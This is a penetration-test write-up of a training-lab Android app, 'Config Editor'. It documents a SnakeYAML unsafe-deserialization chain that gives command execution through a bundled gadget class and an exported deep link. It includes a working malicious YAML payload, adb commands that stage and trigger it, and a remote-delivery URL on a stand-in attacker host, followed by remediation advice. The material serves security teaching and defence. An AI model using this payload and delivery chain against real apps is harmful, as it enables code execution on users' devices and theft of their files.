# Mobile App Pentest — `com.mobilehackinglab.configeditor` ("Config Editor")

**Target:** `com.mobilehackinglab.configeditor.apk` — Mobile Hacking Lab "Config Editor" challenge
**Platform:** Android (minSdk 26, targetSdk 33); bundles SnakeYAML
**Basis:** CTF / lab / training
**Date:** 2026-11-02
**Verification:** **Dynamically confirmed on-device.** Delivering the malicious YAML to the exported
`VIEW` handler (`am start … -d file:///sdcard/evil.yaml`) ran the gadget: the staged payload wrote
`/sdcard/pwned.txt` whose `id` output shows `uid=10180(u0_a180)` — the **Config Editor app's own
process** (not shell `uid=2000`), proving `yaml.load()` → `LegacyCommandUtil` → `Runtime.exec`
executed inside the app. The chain is deterministic (not timing/heap dependent).

---

## Summary

Config Editor opens YAML files and parses them with **SnakeYAML's default (unsafe) constructor**:

```java
// MainActivity.loadYaml(Uri)
Yaml yaml = new Yaml(dumperOptions);     // default Constructor — NOT SafeConstructor
Object deserializedData = yaml.load(inputStream);
```

The default `Yaml`/`Constructor` honours explicit YAML type tags (`!!<fully.qualified.ClassName>`),
so a YAML document can instantiate **arbitrary classes on the app's classpath**. The app ships an
exec gadget that makes that immediately fatal:

```java
// LegacyCommandUtil.kt  (annotated @Deprecated("...unsafe...") but still compiled in)
public final class LegacyCommandUtil {
    public LegacyCommandUtil(String command) {
        Runtime.getRuntime().exec(command);     // runs on construction
    }
}
```

A YAML tag that constructs `LegacyCommandUtil` with a command string therefore gives **arbitrary OS
command execution** in the app's process. And the sink is reachable with essentially no user
interaction: `MainActivity` is **exported with a `BROWSABLE` `VIEW` filter** for `file`/`http`/`https`
+ `application/yaml`, and `handleIntent()` **auto-calls `loadYaml()`** on the incoming URI — a link
or another app can hand it a malicious YAML, which `CopyUtil` will even **download over HTTP(S)**
first (explaining the `INTERNET` permission).

| ID | Finding | Severity | MASVS |
|----|---------|----------|-------|
| CE-01 | Unsafe YAML deserialization — `new Yaml().load()` on attacker input → RCE via bundled gadget — **confirmed on-device** | **Critical** | MASVS-CODE-4 / MASVS-PLATFORM-2 |
| CE-02 | Shipped exec gadget `LegacyCommandUtil(String)` → `Runtime.exec` in its constructor | High | MASVS-CODE-2 |
| CE-03 | Exported, auto-loading `VIEW` deep link (`file`/`http`/`https`, `application/yaml`); remote YAML fetched via `CopyUtil` | High | MASVS-PLATFORM-1 |
| CE-04 | `android:debuggable="true"` in shipped APK | Medium | MASVS-RESILIENCE-1 |
| CE-05 | `android:allowBackup="true"` (app data extractable via `adb backup`) | Medium | MASVS-STORAGE-2 |

Impact amplifier: the process also holds `MANAGE_EXTERNAL_STORAGE` and `INTERNET`, so post-exec a
payload can read/modify all user files and exfiltrate.

---

## CE-01 / CE-02 / CE-03 — The chain

**Entry (exported, auto-load)** — `MainActivity.handleIntent()`:
```java
if ("android.intent.action.VIEW".equals(action) && data != null) {
    CopyUtil.INSTANCE.copyFileFromUri(data)              // file:// copy OR http(s):// download
        .observe(this, uri -> loadYaml(uri));            // auto-parses — no button press
}
```
`CopyUtil` writes the URI's contents to a local file (`HttpURLConnection.openStream()` for remote
URLs), then `loadYaml` parses it with the unsafe `Yaml`.

**Sink** — unsafe deserialization (see Summary) → **gadget** `LegacyCommandUtil` → `Runtime.exec`.

### Malicious YAML (the payload document)
```yaml
!!com.mobilehackinglab.configeditor.LegacyCommandUtil [sh /sdcard/x.sh]
```
When `yaml.load()` resolves the `!!…LegacyCommandUtil` tag it calls the one-arg `String` constructor
with `"sh /sdcard/x.sh"`, which runs it.

> **`Runtime.exec(String)` tokenises on whitespace** (no shell), so the string becomes
> `["sh", "/sdcard/x.sh"]` — i.e. it runs the staged script `x.sh`. Staging the real payload in a
> separate file (whose *contents* may contain spaces, pipes, redirects, `/`) is the clean way around
> that tokenisation; a single-token command (e.g. a lone binary) also works directly.

### PoC (reproduce on the emulator/device)
```bash
# payload script (contents are unrestricted)
adb shell "echo 'id > /sdcard/pwned.txt' > /sdcard/x.sh"

# drop the malicious YAML on the device (or host it and use an http(s) URL instead)
adb push evil.yaml /sdcard/evil.yaml
a
# deliver it to the exported, auto-loading VIEW handler
adb shell am start -a android.intent.action.VIEW \
    -t application/yaml -d file:///sdcard/evil.yaml \
    -n com.mobilehackinglab.configeditor/.MainActivity
```
**Result (confirmed on-device):** merely opening the YAML triggered `loadYaml` → gadget →
`sh /sdcard/x.sh`, creating `/sdcard/pwned.txt` whose `id` output is `uid=10180(u0_a180)` — the
**Config Editor** process (`untrusted_app` context), not the shell caller (`uid=2000`) — proving
code execution inside the app. A remote delivery works the same way with
`-d https://attacker.example/evil.yaml` (the app downloads it via `CopyUtil`).

> **Clean-room check.** The result is unambiguous if you `rm -f /sdcard/pwned.txt` first (confirm it's
> gone), have the payload write a timestamp (`date`), then re-fire and watch it reappear with a
> current time. Note the editor UI shows nothing useful on success — the command runs *during*
> `yaml.load()`, before any text is rendered — so the side-effect file, not the screen, is the proof.
> If `pwned.txt` doesn't appear, check `adb logcat -d -s Companion:*` (loadYaml logs `"Error loading
> YAML"`) and that the app holds `READ_EXTERNAL_STORAGE` so `CopyUtil` can read the file.

---

## CE-04 / CE-05 — Device-posture weaknesses
- **`debuggable="true"`** → `run-as`/debugger access to app-private data on any device.
- **`allowBackup="true"`** → `adb backup` can pull app-private data off the device.

---

## Root cause & remediation
- **Never deserialize untrusted YAML with the default constructor.** Use
  `new Yaml(new SafeConstructor(new LoaderOptions()))` (scalars/collections only — no arbitrary
  type instantiation), or a strict typed `Constructor`/`TypeDescription` allow-list for exactly the
  expected config schema. SnakeYAML ≥ 2.0 also defaults to `SafeConstructor` for `load()`.
- **Delete the gadget.** `LegacyCommandUtil` runs `Runtime.exec` from a constructor and is marked
  deprecated/unsafe — it should not ship at all. Any class reachable by a no-/single-arg constructor
  with side effects is a deserialization gadget.
- **Lock down the entry point.** Don't auto-parse content from an exported `BROWSABLE` `VIEW` filter;
  require explicit user action, validate the source, and treat file/http/https input as hostile.
- Disable `debuggable` and `allowBackup` for release builds; reconsider `MANAGE_EXTERNAL_STORAGE`.

---

## Appendix — environment & method
- Tools: `unzip`/`7z`, `jadx` (decompile + manifest decode); exploitation reproduced by the user on
  an Android emulator via `adb` (VIEW intent → `/sdcard/pwned.txt` written as the app's uid
  `u0_a180`). The code path (`new Yaml().load()` → `LegacyCommandUtil` → `Runtime.exec`) is
  unconditional and the gadget ships in the APK.
- App classes: `MainActivity` (exported VIEW handler, `loadYaml`/`saveYaml`), `CopyUtil`
  (file copy + HTTP(S) download of the URI), `LegacyCommandUtil` (the exec gadget). SnakeYAML is
  bundled under `org.yaml.snakeyaml`.
